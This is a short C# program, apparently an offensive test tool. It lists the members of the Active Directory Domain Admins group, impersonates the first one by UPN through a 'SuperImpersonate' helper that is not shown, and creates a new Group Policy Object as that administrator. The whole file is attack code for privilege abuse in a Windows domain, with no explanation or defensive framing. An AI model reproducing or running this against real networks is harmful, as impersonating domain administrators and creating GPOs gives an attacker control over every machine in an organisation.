using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using Microsoft.GroupPolicy;
using System.DirectoryServices.ActiveDirectory;

namespace GPOTesting {
    class Program {
        static void Main(string[] args) {
            var domainAdmins = FindDomainAdminUsers();
            if(domainAdmins.Count > 0) {
                //upn format is user@domain ex. bobby@bigcorp.local
                var upn = String.Format("{0}@{1}", domainAdmins.First(), Domain.GetComputerDomain().Name);
                Console.WriteLine($"Trying to impersonate {upn}");
                using (new SuperImpersonate(upn)) {
                    var cDomain = Domain.GetComputerDomain();
                    Console.WriteLine("Computer on domain {0}", cDomain.Name);
                    GPDomain domain = new GPDomain(cDomain.Name, "localhost");
                    Console.WriteLine("Setting up GPO");
                    Gpo gpo_background = domain.CreateGpo("GPO Test from UPN");
                }
            }
        }

        public static List<string> FindDomainAdminUsers() {
            var ps = PowerShell.Create().AddCommand("get-adgroupmember");
            ps.AddParameter("Identity", "Domain Admins");
            var psResult = ps.Invoke();
            var adminlist = new List<string>();
            foreach(var item in psResult) {
                Console.WriteLine(String.Format("Found {0} in Domain Admins.", item.Properties["name"].Value));
                adminlist.Add(item.Properties["name"].Value.ToString().ToLower());
            }

            return adminlist;
        }
    }
}
